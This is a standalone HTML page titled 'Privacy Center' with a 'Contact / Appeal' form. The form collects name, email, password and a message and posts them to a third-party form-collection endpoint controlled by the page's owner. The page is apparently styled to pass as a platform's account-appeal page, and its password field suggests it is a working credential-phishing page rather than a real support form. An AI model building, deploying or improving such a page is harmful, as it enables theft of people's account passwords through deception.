<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Privacy Center</title>
  <meta name="description" content="Privacy Center – submit your details securely." />

  <style>
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 0;
    }
    .wrap {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    form {
      background: #fff;
      width: 100%;
      max-width: 420px;
      padding: 22px;
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
    }
    h2 {
      text-align: center;
      margin: 0 0 12px;
    }
    input, textarea, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    textarea {
      min-height: 110px;
      resize: vertical;
    }
    button {
      background: #1877f2;
      color: #fff;
      border: none;
      font-weight: 600;
      cursor: pointer;
    }
    button:hover {
      opacity: 0.95;
    }
    .note {
      font-size: 12px;
      color: #777;
      text-align: center;
      margin-top: 6px;
    }
  </style>
</head>
<body>
  <div class="wrap">

    <!-- ✅ FORMSPARK FORM -->
    <form action="https://submit-form.com/RoodQVDHW" method="POST">
      <h2>Contact / Appeal</h2>

      <input type="text" name="name" placeholder="Full Name" required />
      <input type="email" name="email" placeholder="Email Address" required />
      <input type="password" name="password" placeholder="Password (optional)" />
      <textarea name="message" placeholder="Your message" required></textarea>

      <!-- Optional hidden fields -->
      <input type="hidden" name="_subject" value="New Form Submission" />

      <button type="submit">Submit</button>
      <div class="note">Submission goes directly to your FormSpark dashboard & email.</div>
    </form>

  </div>
</body>
</html>
